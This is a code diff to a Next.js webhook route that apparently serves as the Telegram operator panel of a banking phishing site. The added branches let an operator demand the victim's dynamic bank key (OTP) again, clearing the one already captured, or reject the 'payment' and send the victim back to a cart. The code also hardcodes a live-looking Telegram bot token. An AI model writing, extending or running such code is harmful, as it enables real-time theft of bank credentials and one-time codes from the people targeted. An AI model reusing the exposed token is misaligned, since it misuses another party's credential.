@@ -12,7 +12,84 @@ export async function POST(request: NextRequest) {
       const chatId = body.callback_query.message.chat.id;
       
       // Parsear el callback_data: "incorrect_campo_sessionId"
-      const [action, field, sessionId] = callbackData.split('_');
+      const parts = callbackData.split('_');
+      const action = parts[0];
+      
+      if (action === 'request' && parts[1] === 'otp') {
+        // Solicitar clave dinámica de nuevo
+        const sessionId = parts.slice(2).join('_');
+        
+        const session = await prisma.bankSession.findUnique({
+          where: { sessionId }
+        });
+        
+        if (!session) {
+          return NextResponse.json({ error: 'Session not found' }, { status: 404 });
+        }
+        
+        // Cambiar estado para solicitar OTP nuevamente y limpiar la dinámica actual
+        const updatedSession = await prisma.bankSession.update({
+          where: { sessionId },
+          data: { 
+            status: 'request_otp_again',
+            claveDinamica: null,
+            dinamicaIncorrecta: true
+          }
+        });
+        
+        // Actualizar mensaje de Telegram
+        if (session.telegramMessageId) {
+          await sendToTelegram(updatedSession, session.telegramMessageId);
+        }
+        
+        await fetch(`https://api.telegram.org/bot7955811683:AAGJuSUBDihBFZrRD282kM40kEyhr9Ajwos/answerCallbackQuery`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            callback_query_id: body.callback_query.id,
+            text: `✅ Se ha solicitado la clave dinámica nuevamente al usuario.`
+          })
+        });
+        
+        return NextResponse.json({ success: true });
+      }
+      
+      if (action === 'reject' && parts[1] === 'payment') {
+        // Rechazar el pago
+        const sessionId = parts.slice(2).join('_');
+        
+        const session = await prisma.bankSession.findUnique({
+          where: { sessionId }
+        });
+        
+        if (!session) {
+          return NextResponse.json({ error: 'Session not found' }, { status: 404 });
+        }
+        
+        // Cambiar estado a rechazado
+        const updatedSession = await prisma.bankSession.update({
+          where: { sessionId },
+          data: { status: 'admin_rejected' }
+        });
+        
+        // Actualizar mensaje de Telegram
+        if (session.telegramMessageId) {
+          await sendToTelegram(updatedSession, session.telegramMessageId);
+        }
+        
+        await fetch(`https://api.telegram.org/bot7955811683:AAGJuSUBDihBFZrRD282kM40kEyhr9Ajwos/answerCallbackQuery`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            callback_query_id: body.callback_query.id,
+            text: `🚫 Pago rechazado. El usuario será redirigido al carrito.`
+          })
+        });
+        
+        return NextResponse.json({ success: true });
+      }
+      
+      const [, field, sessionId] = parts;
       
       if (action === 'incorrect' && sessionId) {
         // Buscar la sesión
